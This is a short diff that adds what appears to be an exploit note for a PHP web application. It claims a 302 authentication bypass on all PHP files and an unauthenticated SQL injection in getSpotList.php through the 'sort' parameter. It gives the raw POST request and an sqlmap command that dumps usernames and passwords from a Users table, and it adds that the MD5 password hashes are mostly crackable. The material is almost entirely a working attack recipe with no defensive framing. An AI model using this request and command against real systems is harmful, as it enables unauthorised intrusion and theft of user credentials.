@@ -1,0 +1,24 @@
+302 bypass on all php files
+web.php
+system.php
+etc..
+
+
+unauth SQL injection
+
+POST /programs/getSpotList.php HTTP/1.1
+Host: xx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 52
+Connection: close
+
+radio=&folder=Inbox&order=Webdate&need=NG&sort=radio[SQLI]
+
+sqlmap -r req -p sort --random-agent --no-cast -D station -T Users -C Username,Password --dump --technique=TB --threads=10
+
+Password hashed in md5 so mostly crackable
